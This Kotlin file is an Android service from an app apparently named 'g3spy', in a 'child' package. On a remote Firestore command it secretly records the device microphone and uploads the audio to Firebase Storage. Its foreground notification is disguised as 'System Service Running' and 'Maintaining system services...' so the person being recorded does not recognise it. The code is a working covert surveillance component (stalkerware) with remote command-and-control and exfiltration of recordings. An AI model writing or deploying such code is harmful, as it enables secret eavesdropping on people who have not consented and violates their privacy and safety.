package com.g3spy.child.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.Uri
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.g3spy.child.util.NotificationChannelManager
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

/**
 * Service that handles audio recording and uploads to Firebase Storage
 */
class MicRecordingService : Service() {
    companion object {
        private const val TAG = "MicRecordingService"
        private const val NOTIFICATION_ID = 1005
        private const val CHANNEL_ID = "mic_recording_channel"
        private const val CHANNEL_NAME = "Microphone Recording"
        private const val DEFAULT_RECORDING_DURATION = 60000L // 1 minute
    }
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var storage: FirebaseStorage
    private var commandListener: ListenerRegistration? = null
    
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentRecordingFile: File? = null
    private var recordingStartTime: Long = 0
    
    // Executor for background tasks
    private val executor = Executors.newSingleThreadExecutor()
    
    private val binder = LocalBinder()
    
    inner class LocalBinder : Binder() {
        fun getService(): MicRecordingService = this@MicRecordingService
    }
    
    override fun onCreate() {
        super.onCreate()
        
        firestore = FirebaseFirestore.getInstance()
        storage = FirebaseStorage.getInstance()
        
        // Create the notification channel
        NotificationChannelManager.createNotificationChannel(
            this,
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        
        // Listen for audio recording commands
        listenForRecordingCommands()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "MicRecordingService started")
        
        // Create a notification for the foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder {
        return binder
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopRecording()
        commandListener?.remove()
        executor.shutdown()
    }
    
    private fun createNotification(): Notification {
        // Create an intent that will open the app when tapped
        val notificationIntent = Intent(this, this::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        // Build the notification
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Running")
            .setContentText("Maintaining system services...")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun listenForRecordingCommands() {
        commandListener = firestore.collection("remote_commands")
            .whereEqualTo("command", "AUDIO_RECORD")
            .whereEqualTo("isExecuted", false)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen failed", e)
                    return@addSnapshotListener
                }
                
                snapshots?.documentChanges?.forEach { change ->
                    val command = change.document
                    Log.d(TAG, "Received audio recording command: ${command.id}")
                    
                    // Extract duration from command if provided
                    val params = command.get("params") as? Map<String, Any>
                    val durationMs = params?.get("durationMs") as? Long ?: DEFAULT_RECORDING_DURATION
                    
                    // Start recording
                    startRecording(durationMs) { success ->
                        if (success) {
                            // Mark the command as executed
                            command.reference.update("isExecuted", true)
                        }
                    }
                }
            }
    }
    
    private fun startRecording(durationMs: Long, callback: (Boolean) -> Unit) {
        if (isRecording) {
            Log.d(TAG, "Already recording, stopping current recording first")
            stopRecording()
        }
        
        val audioFile = createAudioFile()
        currentRecordingFile = audioFile
        
        if (audioFile == null) {
            Log.e(TAG, "Failed to create audio file")
            callback(false)
            return
        }
        
        try {
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            
            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(audioFile.absolutePath)
                
                try {
                    prepare()
                    start()
                    
                    isRecording = true
                    recordingStartTime = System.currentTimeMillis()
                    Log.d(TAG, "Recording started, duration: ${durationMs}ms")
                    
                    // Schedule recording to stop after the specified duration
                    executor.execute {
                        try {
                            Thread.sleep(durationMs)
                            
                            if (isRecording) {
                                stopRecording()
                                // Upload the recording
                                uploadRecording(audioFile, (System.currentTimeMillis() - recordingStartTime).toInt() / 1000)
                            }
                        } catch (e: InterruptedException) {
                            Log.e(TAG, "Recording interrupted", e)
                        }
                    }
                    
                    callback(true)
                } catch (e: IOException) {
                    Log.e(TAG, "Failed to start recording", e)
                    callback(false)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing MediaRecorder", e)
            callback(false)
        }
    }
    
    private fun stopRecording() {
        if (isRecording) {
            try {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                mediaRecorder = null
                isRecording = false
                Log.d(TAG, "Recording stopped")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping recording", e)
            }
        }
    }
    
    private fun createAudioFile(): File? {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "AUDIO_$timeStamp.mp4"
        val storageDir = getExternalFilesDir(null)
        
        return if (storageDir != null) {
            File(storageDir, fileName)
        } else {
            Log.e(TAG, "External files directory is null")
            null
        }
    }
    
    private fun uploadRecording(file: File, durationSeconds: Int) {
        // Create a reference to Firebase Storage
        val timestamp = System.currentTimeMillis()
        val filename = "audio_${timestamp}.mp4"
        val storageRef = storage.reference.child("audio_recordings/$filename")
        
        // Upload the file
        val uploadTask = storageRef.putFile(Uri.fromFile(file))
        uploadTask.addOnSuccessListener {
            // Get the download URL
            storageRef.downloadUrl.addOnSuccessListener { uri ->
                // Save the audio recording metadata to Firestore
                val recordingData = hashMapOf(
                    "audioUrl" to uri.toString(),
                    "timestamp" to Timestamp.now(),
                    "duration" to durationSeconds
                )
                
                firestore.collection("audio_recordings")
                    .add(recordingData)
                    .addOnSuccessListener { documentReference ->
                        Log.d(TAG, "Audio recording uploaded with ID: ${documentReference.id}")
                        
                        // Clean up the file
                        file.delete()
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Error uploading audio recording metadata", e)
                    }
            }
        }.addOnFailureListener { e ->
            Log.e(TAG, "Error uploading audio recording", e)
            file.delete()
        }
    }
}